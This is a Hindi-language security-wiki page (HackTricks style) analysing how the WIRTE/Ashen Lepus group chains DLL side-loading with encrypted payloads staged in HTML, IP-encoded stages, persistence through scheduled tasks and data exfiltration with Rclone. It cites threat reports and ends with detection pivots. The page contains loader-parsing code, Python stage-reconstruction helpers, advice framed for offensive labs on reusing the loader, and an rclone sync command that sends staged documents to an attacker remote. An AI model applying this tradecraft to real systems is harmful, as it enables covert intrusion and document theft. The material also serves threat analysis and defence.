# HTML-Embedded Payload Staging के साथ Advanced DLL Side-Loading

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (जिसे WIRTE के नाम से भी जाना जाता है) ने एक दोहराए जा सकने वाले pattern को weaponize किया, जो DLL sideloading, staged HTML payloads और modular .NET backdoors को chain करके Middle Eastern diplomatic networks के अंदर persistence बनाए रखता है। यह technique किसी भी operator द्वारा reuse की जा सकती है क्योंकि यह निम्न पर निर्भर करती है:<sup>[[1]](#references)</sup>

- **Archive-based social engineering**: benign PDFs targets को file-sharing site से RAR archive डाउनलोड करने का निर्देश देते हैं। Archive में एक वास्तविक दिखने वाला document viewer EXE, trusted library के नाम वाली malicious DLL (जैसे `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) और एक decoy `Document.pdf` शामिल होते हैं।
- **DLL search order abuse**: victim EXE पर double-click करता है, Windows current directory से DLL import को resolve करता है, और malicious loader (AshenLoader) trusted process के अंदर execute होता है, जबकि suspicion से बचने के लिए decoy PDF खुल जाता है।
- **Living-off-the-land staging**: हर बाद का stage (AshenStager → AshenOrchestrator → modules) आवश्यकता पड़ने तक disk से बाहर रखा जाता है और otherwise harmless HTML responses के अंदर छिपे encrypted blobs के रूप में deliver किया जाता है।

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE AshenLoader को side-load करता है, जो host recon करता है, इसे AES-CTR से encrypt करता है और `token=`, `id=`, `q=` या `auth=` जैसे rotating parameters के अंदर API जैसे दिखने वाले paths (जैसे `/api/v2/account`) पर POST करता है।<sup>[[1]](#references)</sup>
2. **HTML extraction**: C2 अगला stage केवल तब प्रकट करता है जब client IP target region में geolocate हो और `User-Agent` implant से match करे, जिससे sandboxes बाधित होते हैं। Checks पास होने पर HTTP body में `<headerp>...</headerp>` blob होता है, जिसमें Base64/AES-CTR encrypted AshenStager payload होता है।
3. **Second sideload**: AshenStager को एक अन्य legitimate binary के साथ deploy किया जाता है, जो `wtsapi32.dll` import करता है। Binary में injected malicious copy अधिक HTML fetch करती है और इस बार AshenOrchestrator को recover करने के लिए `<article>...</article>` को carve करती है।
4. **AshenOrchestrator**: एक modular .NET controller जो Base64 JSON config को decode करता है। Config के `tg` और `au` fields को concatenate/hash करके AES key बनाई जाती है, जो `xrk` को decrypt करती है। परिणामी bytes बाद में fetch किए गए हर module blob के लिए XOR key के रूप में कार्य करते हैं।
5. **Module delivery**: प्रत्येक module को HTML comments के माध्यम से describe किया जाता है, जो parser को किसी arbitrary tag पर redirect करते हैं और उन static rules को तोड़ते हैं जो केवल `<headerp>` या `<article>` देखते हैं। Modules में persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) और file exploration (`FE`) शामिल हैं।

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
भले ही defenders किसी विशिष्ट element को block या strip कर दें, delivery फिर से शुरू करने के लिए operator को केवल HTML comment में संकेत दिए गए tag को बदलना होता है।<sup>[[1]](#references)</sup>

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion के समानांतर

हालिया HTML smuggling research (Talos) में HTML attachments के अंदर `<script>` blocks में Base64 strings के रूप में छिपे payloads और runtime पर JavaScript के माध्यम से उनके decoded होने को दिखाया गया है।<sup>[[2]](#references)</sup> इसी trick का उपयोग C2 responses के लिए भी किया जा सकता है: encrypted blobs को किसी script tag (या अन्य DOM element) के अंदर stage करें और AES/XOR से पहले उन्हें in-memory decode करें, जिससे page सामान्य HTML जैसा दिखाई दे। Talos ने script tags के अंदर layered obfuscation (identifier renaming और Base64/Caesar/AES) भी दिखाया है, जो HTML-staged C2 blobs पर आसानी से लागू होता है।<sup>[[2]](#references)</sup> Talos का बाद का **hidden text salting** writeup भी यहां प्रासंगिक है: Base64 को अप्रासंगिक HTML comments या whitespace से विभाजित करना simple regex extractors को तोड़ने के लिए पर्याप्त है, जबकि browser-side reconstruction आसान रहता है।<sup>[[7]](#references)</sup>

## हालिया Variant Notes (2024-2025)

- Check Point ने 2024 में WIRTE campaigns देखीं, जो अभी भी archive-based sideloading पर निर्भर थीं, लेकिन first stage के रूप में `propsys.dll` (stagerx64) का उपयोग करती थीं। stager अगले payload को Base64 + XOR (key `53`) से decode करता है, hardcoded `User-Agent` के साथ HTTP requests भेजता है और HTML tags के बीच embedded encrypted blobs को extract करता है। एक branch में, stage को `RtlIpv4StringToAddressA` से decoded embedded IP strings की लंबी सूची से reconstruct किया गया, जिन्हें बाद में payload bytes में concatenate किया गया।<sup>[[3]](#references)</sup>
- OWN-CERT ने पहले के WIRTE tooling को document किया, जिसमें side-loaded `wtsapi32.dll` dropper strings को Base64 + TEA से सुरक्षित करता था और DLL name को ही decryption key के रूप में उपयोग करता था। इसके बाद यह host identification data को XOR/Base64 से obfuscate करके C2 को भेजता था।<sup>[[4]](#references)</sup>

## IP-Encoded Stages को Reconstruct करना

WIRTE की 2024 `propsys.dll` branch दिखाती है कि अगले PE को एक contiguous HTML blob के रूप में रखना आवश्यक नहीं है। Loader stage bytes को dotted-quad strings के रूप में stash कर सकता है और `RtlIpv4StringToAddressA` के माध्यम से उन्हें rebuild कर सकता है। यह pattern Hive की **IPfuscation** tradecraft से closely related है।<sup>[[3]](#references)[[5]](#references)</sup> Operationally, यह तब उपयोगी है जब actor चाहता है कि HTML page में obvious Base64 payload के बजाय harmless IOCs या config data जैसा दिखाई देने वाला content हो।
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
यदि recovered bytes `MZ` से शुरू होते हैं, तो संभवतः आपने अगला PE सीधे reconstruct किया है। यदि नहीं, तो आगे मौजूद XOR/Base64 layer या addresses के बीच मौजूद छोटे delimiter chunks की जाँच करें।

## Swappable DLL Names & Host Rotation

इस pattern की एक महत्वपूर्ण विशेषता यह है कि **HTML/AES/XOR staging backend समान रह सकता है, जबकि केवल sideload pair बदलता है**। WIRTE ने अलग-अलग campaigns में `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` और `propsys.dll` का rotation किया, जो उपयोगी है क्योंकि:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` और `wtsapi32.dll` सामान्य Windows DLL names हैं, जिनके `%System32%` / `%SysWOW64%` में मौजूद होने की defenders अपेक्षा करते हैं।
- **HijackLibs** जैसे public catalogs पहले से ही ऐसे कई binaries को map करते हैं जो copied application directory से इन DLL names को load करेंगे। इससे operators को stager को फिर से design किए बिना replacement hosts मिल जाते हैं।
- केवल export surface को प्रत्येक host के अनुसार adapt करना आवश्यक है। HTML parser, AES/XOR routines और module loader को आमतौर पर forwarding proxy DLL में बिना बदलाव के transplant किया जा सकता है।

Offensive lab work के लिए इसका अर्थ है कि आप समस्या को **(1) ऐसे stable signed host को खोजें जो आपके चुने हुए DLL name को locally resolve करे** और **(2) उसी DLL के पीछे staged-HTML loader logic को reuse करें** में बाँट सकते हैं।

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders में 256-bit keys और nonces (जैसे `{9a 20 51 98 ...}`) embedded होते हैं और decryption से पहले/बाद `msasn1.dll` जैसी strings का उपयोग करके XOR layer भी जोड़ी जा सकती है।<sup>[[1]](#references)</sup>
- **Key material variations**: earlier loaders embedded strings को सुरक्षित रखने के लिए Base64 + TEA का उपयोग करते थे, जिसमें decryption key malicious DLL name (जैसे `wtsapi32.dll`) से derive की जाती थी।<sup>[[4]](#references)</sup>
- **Infrastructure split + subdomain camouflage**: staging servers को प्रत्येक tool के लिए अलग रखा जाता है, अलग-अलग ASNs पर host किया जाता है और कभी-कभी legitimate-looking subdomains के पीछे front किया जाता है, ताकि एक stage के उजागर होने से बाकी infrastructure सामने न आए।
- **Recon smuggling**: enumerated data में अब high-value apps का पता लगाने के लिए Program Files listings भी शामिल होती हैं और host से बाहर भेजे जाने से पहले इसे हमेशा encrypted किया जाता है।
- **URI churn**: query parameters और REST paths campaigns के बीच rotate होते हैं (`/api/v1/account?token=` → `/api/v2/account?auth=`), जिससे brittle detections निष्प्रभावी हो जाते हैं।
- **User-Agent pinning + safe redirects**: C2 infrastructure केवल exact UA strings पर response देता है और अन्य requests को benign news/health sites पर redirect करता है, ताकि traffic सामान्य दिखाई दे।
- **Gated delivery**: servers geo-fenced होते हैं और केवल वास्तविक implants को response देते हैं। Unapproved clients को unsuspicious HTML मिलता है।

## Persistence & Execution Loop

AshenStager ऐसे scheduled tasks drop करता है जो Windows maintenance jobs का रूप धारण करते हैं और `svchost.exe` के माध्यम से execute होते हैं, जैसे:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

ये tasks boot पर या निर्धारित intervals पर sideloading chain को relaunch करते हैं, जिससे AshenOrchestrator को disk को दोबारा छुए बिना fresh modules request करने की सुविधा मिलती है।

## Using Benign Sync Clients for Exfiltration

Operators एक dedicated module के माध्यम से diplomatic documents को `C:\Users\Public` (world-readable और unsuspicious) में stage करते हैं, फिर उस directory को attacker storage के साथ synchronize करने के लिए legitimate [Rclone](https://rclone.org/) binary download करते हैं। Unit42 के अनुसार, यह पहली बार है जब इस actor को exfiltration के लिए Rclone का उपयोग करते हुए देखा गया है। यह legitimate sync tooling का दुरुपयोग करके सामान्य traffic में blend होने की व्यापक प्रवृत्ति के अनुरूप है:<sup>[[1]](#references)</sup>

1. **Stage**: target files को `C:\Users\Public\{campaign}\` में copy/collect करें।
2. **Configure**: attacker-controlled HTTPS endpoint (जैसे `api.technology-system[.]com`) की ओर संकेत करने वाला Rclone config भेजें।
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` चलाएँ, ताकि traffic सामान्य cloud backups जैसा दिखाई दे।

क्योंकि Rclone का legitimate backup workflows में व्यापक रूप से उपयोग होता है, defenders को anomalous executions (new binaries, odd remotes या `C:\Users\Public` की अचानक syncing) पर ध्यान केंद्रित करना चाहिए।

## Detection Pivots

- ऐसे **signed processes** पर alert करें जो user-writable paths से अनपेक्षित रूप से DLLs load करते हैं (Procmon filters + `Get-ProcessMitigation -Module`), विशेषकर तब जब DLL names `netutils`, `srvcli`, `dwampi`, `wtsapi32` या `propsys` से मिलते हों।<sup>[[6]](#references)</sup>
- Suspicious HTTPS responses में **unusual tags के अंदर embedded large Base64 blobs** या `<!-- TAG: <xyz> -->` comments से guarded blobs की जाँच करें।
- पहले HTML को normalize करें: **Base64 extraction से पहले comments strip करें और whitespace collapse करें**, क्योंकि hidden-text-salting style evasion payloads को comment boundaries के बीच split कर सकती है।
- HTML hunting को **`<script>` blocks के अंदर मौजूद Base64 strings** तक बढ़ाएँ (HTML smuggling-style staging), जिन्हें AES/XOR processing से पहले JavaScript के माध्यम से decode किया जाता है।
- **`RtlIpv4StringToAddressA` के बाद buffer assembly की repeated calls** के लिए hunt करें, विशेषकर तब जब आसपास की strings वास्तविक network targets के बजाय लंबी IPv4 lists हों।
- ऐसे **scheduled tasks** के लिए hunt करें जो `svchost.exe` को non-service arguments के साथ चलाते हों या dropper directories की ओर point करते हों।
- ऐसे **C2 redirects** को track करें जो केवल exact `User-Agent` strings के लिए payloads लौटाते हों और अन्य requests को legitimate news/health domains पर bounce करते हों।
- IT-managed locations के बाहर दिखाई देने वाली **Rclone** binaries, नई `rclone.conf` files या `C:\Users\Public` जैसी staging directories से data pull करने वाली sync jobs को monitor करें।

## References

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
